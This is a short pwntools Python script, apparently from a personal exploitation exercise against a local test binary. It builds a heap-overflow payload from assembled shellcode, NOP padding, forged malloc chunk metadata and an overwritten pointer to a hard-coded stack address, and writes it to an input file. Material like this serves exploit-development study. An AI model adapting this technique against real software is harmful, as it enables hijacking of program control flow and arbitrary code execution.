#!/usr/bin/env python3

# import variables/functions from pwntools into our global namespace,
# for easy access
from pwn import *

EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/heap_test'

# foo
ORIGINAL_FUNCTION_ADDRESS = 0x40117c
# bar
INJECT_FUNCTION_ADDRESS = 0x401166

CHECK_VALUE_HEAP_ADDRESS = 0x4052a0
CHECK_VALUE = 0xAAAAAAAA

BUFFER_STACK_ADDRESS = 0x7fffffffec40

BUFFER_SIZE = 64
MALLOC_META_SIZE = 16

context.binary = EXE_PATH


# 21 is the malloc bookeeping value. It appears to be the size + 1 including this metadata. For the function pointer (size 8 bytes) this appears to be the 16 byte minimum size + 16 bytes for the metadata.
MALLOC_META_DATA = b'\x00' * 8 + p32(0x21) + b'\x00' * 4


sh = asm(f'''
    mov     rax, {CHECK_VALUE_HEAP_ADDRESS}
    cmp     DWORD PTR [rax], {CHECK_VALUE}
    jne     .L_skip
    mov     rax, {INJECT_FUNCTION_ADDRESS}
    call    rax
.L_skip:
    mov     rax, {ORIGINAL_FUNCTION_ADDRESS}
    call    rax
    ret
''')


print(f"Size of injection: {len(sh)}")


filler_len = BUFFER_SIZE - len(sh)

payload = sh
payload += asm('nop') * filler_len
payload += MALLOC_META_DATA
payload += p64(BUFFER_STACK_ADDRESS)

with open('./bin/input4', 'wb') as fd:
    fd.write(payload)
